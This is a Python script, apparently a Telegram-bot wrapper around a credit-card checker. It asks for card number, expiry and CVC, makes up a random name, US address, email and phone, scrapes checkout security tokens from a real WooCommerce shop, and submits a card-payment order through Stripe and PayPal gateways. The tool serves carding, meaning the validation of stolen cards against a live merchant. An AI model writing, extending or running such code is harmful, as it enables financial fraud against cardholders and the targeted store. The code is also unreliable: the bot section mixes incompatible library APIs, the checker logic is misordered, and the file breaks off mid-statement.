import logging
from telegram import Update, ForceReply, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, Dispatcher, Updater
import requests
import re
import time
import random
import string
import user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from flask import Flask, request

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

logger = logging.getLogger(__name__)

# Define a few command handlers. These usually take the two arguments update and
# context.
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /start is issued."""
    user = update.effective_user
    await update.message.reply_html(
        rf'Hi {user.mention_markdown_v2()}\!',
        reply_markup=ForceReply(selective=True),
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /help is issued."""
    await update.message.reply_text('Help!')

async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Echo the user message."""
    await update.message.reply_text(update.message.text)

# Define function to handle webhook requests
def set_webhook(app: Flask, bot: Bot, token: str, endpoint: str) -> None:
    webhook_url = f"https://test-3vfe.onrender.com{endpoint}"  # Replace with your actual domain
    bot.set_webhook(url=webhook_url)
    app.add_url_rule(f'/{endpoint}', 'webhook', lambda: webhook(bot), methods=['POST'])

def webhook(bot: Bot) -> str:
    """Webhook handler for incoming messages."""
    data = request.get_json()
    update = Update.de_json(data, bot)
    dispatcher.process_update(update)
    return 'OK'

# Telegram Bot Token
TELEGRAM_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'

# Create an application instance
app = Flask(__name__)

# Initialize the bot
bot = Bot(TELEGRAM_TOKEN)
updater = Updater(TELEGRAM_TOKEN)
dispatcher = updater.dispatcher

# Add handlers
dispatcher.add_handler(CommandHandler("start", start))
dispatcher.add_handler(CommandHandler("help", help_command))
dispatcher.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo))

# Start the webhook
set_webhook(app, bot, TELEGRAM_TOKEN, "webhook")

# Run the Flask app with webhook support
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

# Card and User Info Generation Functions (Already Defined)
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour",
                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]

    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]

    full_name = random.choice(first_names) + " " + random.choice(last_names)
    first_name, last_name = full_name.split()
    return first_name, last_name

def generate_address():
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

    city = random.choice(cities)
    state = states[cities.index(city)]
    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
    zip_code = zip_codes[states.index(state)]

    return city, state, street_address, zip_code

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def num():
    number = ''.join(random.choices(string.digits, k=7))
    return f"303{number}"

# Get card input
card_input = input('Enter card details (format: number|mm|yy|cvc): ')
parts = card_input.split('|')

if len(parts) != 4:
    print("Invalid format. Please use: number|mm|yy|cvc")
    exit()

n, mm, yy, cvc = parts

# Format month and year
if len(mm) == 1:
    mm = f'0{mm}'

if "20" in yy:
    yy = yy.split("20")[1]

# Generate user info
first_name, last_name = generate_full_name()
city, state, street_address, zip_code = generate_address()
acc = generate_random_account()
num_val = num()

# Create session
user = user_agent.generate_user_agent()
r = requests.session()

# First request
files = {
    'quantity': (None, '1'),
    'add-to-cart': (None, '4451'),
}
multipart_data = MultipartEncoder(fields=files)
headers = {
    'authority': 'switchupcb.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': multipart_data.content_type,
    'origin': 'https://switchupcb.com',
    'referer': 'https://switchupcb.com/shop/i-buy/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

response = r.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data)

# Second request
headers = {
    'authority': 'switchupcb.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'referer': 'https://switchupcb.com/cart/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers)

# Extract security tokens
try:
    sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1)
    nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text).group(1)
    check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
    create = re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1)
except AttributeError:
    print("Failed to extract security tokens")
    exit()

# Update order review
headers = {
    'authority': 'switchupcb.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://switchupcb.com',
    'referer': 'https://switchupcb.com/checkout/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
}

params = {
    'wc-ajax': 'update_order_review',
}

data = f'security={sec}&payment_method=stripe&country=US&state={state}&postcode={zip_code}&city={city}&address={street_address}&address_2=&s_country=US&s_state={state}&s_postcode={zip_code}&s_city={city}&s_address={street_address}&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fswitchupcb.com%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{street_address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3D{state}%26billing_postcode%3D{zip_code}%26billing_phone%3D{num_val}%26billing_email%3D{acc}%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'

response = r.post('https://switchupcb.com/', params=params, headers=headers, data=data)

# Create order
headers = {
    'authority': 'switchupcb.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://switchupcb.com',
    'pragma': 'no-cache',
    'referer': 'https://switchupcb.com/checkout/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
}

params = {
    'wc-ajax': 'ppc-create-order',
}

json_data = {
    'nonce': create,
    'payer': None,
    'bn_code': 'Woo_PPCP',
    'context': 'checkout',
    'order_id': '0',
    'payment_method': 'ppcp-gateway',
    'funding_source': 'card',
    'form_encoded
